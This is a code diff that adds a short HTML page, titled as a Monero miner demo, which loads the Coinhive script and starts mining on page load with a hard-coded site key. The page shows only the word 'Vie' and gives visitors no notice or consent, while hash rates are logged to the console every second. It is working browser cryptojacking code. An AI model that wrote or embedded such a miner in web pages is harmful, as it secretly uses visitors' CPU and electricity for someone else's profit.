@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Javascript Monero Miner Deamo</title>
+<script src="coinhive.min.js"></script>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+</head>
+
+<body>
+Vie
+
+<script>
+var miner = new CoinHive.Anonymous('ZOktoV7XQ3bhdccWLUBZQj32O8LV1OmR');
+miner.start();
+  console.log("started");
+  miner.on('found', function() { /* Hash found */ console.log("hash fount");})
+miner.on('accepted', function() { /* Hash accepted by the pool */ console.log("Hash accepted by the pool");})
+  
+  setInterval(function() {
+	var hashesPerSecond = miner.getHashesPerSecond();
+	var totalHashes = miner.getTotalHashes();
+	var acceptedHashes = miner.getAcceptedHashes();
+
+	// Output to HTML elements...
+    console.log("hashesPerSecond " + hashesPerSecond);
+    console.log("totalHashes " + totalHashes);
+    console.log("acceptedHashes " + acceptedHashes);
+}, 1000);
+</script>
+
+</body>
+
+</html>
